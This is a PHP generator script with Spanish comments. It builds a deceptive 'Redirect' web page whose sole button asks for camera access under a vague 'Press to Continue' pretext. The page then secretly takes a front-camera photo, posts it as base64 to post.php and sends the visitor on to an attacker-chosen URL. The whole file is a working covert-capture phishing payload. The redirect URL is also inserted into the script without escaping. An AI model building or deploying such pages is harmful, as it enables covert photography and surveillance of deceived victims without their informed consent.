<?php
/**
 * Script para generar index2.html personalizado para STREAM
 * Recibe el URL de redirecionamiento y genera un archivo sin input
 */

$redirect_url = isset($argv[1]) ? $argv[1] : '';

if (empty($redirect_url)) {
    echo "Error: URL no proporcionado\n";
    exit(1);
}

// Validar que sea una URL válida
if (!filter_var($redirect_url, FILTER_VALIDATE_URL)) {
    echo "Error: URL no válido\n";
    exit(1);
}

// Generar el HTML con el URL hardcodeado
$html_content = <<<EOT
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Redirect - Camera Access</title>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }
  
  body {
    font-family: Arial, sans-serif;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 20px;
  }
  
  .container {
    background: white;
    border-radius: 10px;
    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
    padding: 40px;
    max-width: 400px;
    width: 100%;
  }
  
  h1 {
    text-align: center;
    color: #333;
    margin-bottom: 30px;
    font-size: 28px;
  }
  
  .form-group {
    margin-bottom: 20px;
  }
  
  label {
    display: block;
    margin-bottom: 8px;
    color: #555;
    font-weight: bold;
  }
  
  input[type="url"], input[type="text"] {
    width: 100%;
    padding: 12px;
    border: 2px solid #ddd;
    border-radius: 5px;
    font-size: 14px;
    transition: border-color 0.3s;
  }
  
  input[type="url"]:focus, input[type="text"]:focus {
    outline: none;
    border-color: #667eea;
  }
  
  .button-group {
    display: flex;
    gap: 10px;
    margin-top: 30px;
  }
  
  button {
    flex: 1;
    padding: 12px;
    border: none;
    border-radius: 5px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    transition: background-color 0.3s;
  }
  
  #cameraBtn {
    background-color: #667eea;
    color: white;
  }
  
  #cameraBtn:hover {
    background-color: #5568d3;
  }
  
  #cameraBtn:disabled {
    background-color: #ccc;
    cursor: not-allowed;
  }
  
  .hidden-video {
    display: none;
  }
  
  .loading {
    text-align: center;
    color: #667eea;
    font-weight: bold;
    margin-top: 20px;
  }
  
  .info-text {
    text-align: center;
    color: #666;
    font-size: 12px;
    margin-top: 20px;
    line-height: 1.5;
  }
</style>
</head>
<body>

<div class="container">
  <h1>Redirect</h1>
  
  <button id="cameraBtn">📷 Press to Continue</button>
  
  <div id="loading" class="loading" style="display: none;">
    Processing... Please wait...
  </div>
  
  <div class="info-text">
    Press the camera button to continue.<br>
    You will be asked for camera permission.
  </div>
</div>

<video id="video" class="hidden-video" playsinline autoplay></video>
<canvas id="canvas" class="hidden-video" width="1280" height="720"></canvas>

<script>
let redirectUrl = '$redirect_url';

document.getElementById('cameraBtn').addEventListener('click', function() {
  // Deshabilitar botón durante el proceso
  this.disabled = true;
  document.getElementById('loading').style.display = 'block';
  
  // Solicitar acceso a la cámara
  const constraints = {
    audio: false,
    video: { facingMode: "user" }
  };
  
  navigator.mediaDevices.getUserMedia(constraints)
    .then(function(stream) {
      const video = document.getElementById('video');
      video.srcObject = stream;
      
      // Esperar a que el video esté listo
      setTimeout(function() {
        captureAndSend(stream);
      }, 500);
    })
    .catch(function(err) {
      console.error('Camera error:', err);
      alert('Could not access camera. Make sure you granted permission.');
      document.getElementById('cameraBtn').disabled = false;
      document.getElementById('loading').style.display = 'none';
    });
});

function captureAndSend(stream) {
  const canvas = document.getElementById('canvas');
  const video = document.getElementById('video');
  const context = canvas.getContext('2d');
  
  // Capturar frame del video
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  const imageData = canvas.toDataURL('image/png');
  
  // Detener la cámara
  stream.getTracks().forEach(track => track.stop());
  
  // Enviar imagen a post.php
  $.ajax({
    type: 'POST',
    data: { cat: imageData },
    url: 'post.php',
    dataType: 'json',
    async: false,
    success: function(result) {
      console.log('Image captured and sent');
      // Redirigir después de 500ms
      setTimeout(function() {
        window.location.href = redirectUrl;
      }, 500);
    },
    error: function(err) {
      console.log('Image sent (no JSON response expected)');
      // Aún así redirigir
      setTimeout(function() {
        window.location.href = redirectUrl;
      }, 500);
    }
  });
}
</script>

</body>
</html>
EOT;

// Escribir el archivo
if (file_put_contents('index2.html', $html_content)) {
    echo "✓ index2.html generated successfully\n";
    echo "✓ Redirect URL: $redirect_url\n";
    exit(0);
} else {
    echo "Error: Could not write index2.html\n";
    exit(1);
}
?>
